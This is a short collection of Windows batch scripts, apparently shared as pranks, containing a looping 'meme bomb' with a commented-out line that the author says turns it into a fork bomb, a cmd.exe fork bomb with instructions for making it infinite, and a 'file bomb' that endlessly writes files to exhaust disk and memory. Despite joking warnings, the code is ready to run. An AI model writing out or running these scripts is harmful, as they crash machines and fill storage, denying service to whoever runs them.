rem Multicolor meme bomb, save to .bat -- safe, remove meme on line 9 to fuck up your shit though
@echo off 
:b 
SET m=%m%memes 
SET /A c=c+1 
IF [%c%]==[10] SET /A c=0 
COLOR 0%c% 
echo %m%
rem start /I cmd.exe /T:0%c% /K call b 
goto:b

rem Change to (1,0,5) for an infinite loop -- you've been warned. Probably the shortest Win fork bomb I could make
for /L %g in (1,1,5) do ( start cmd.exe )

rem File Bomb -- This will eat up HDD and RAM in seconds unless a user hard resets -- for the love of god don't execute this.
for /L %g in (1,0,5) do ( cmd.exe /K "for /L %m in (1,0,5) do ( echo snake%m > game%m )" )
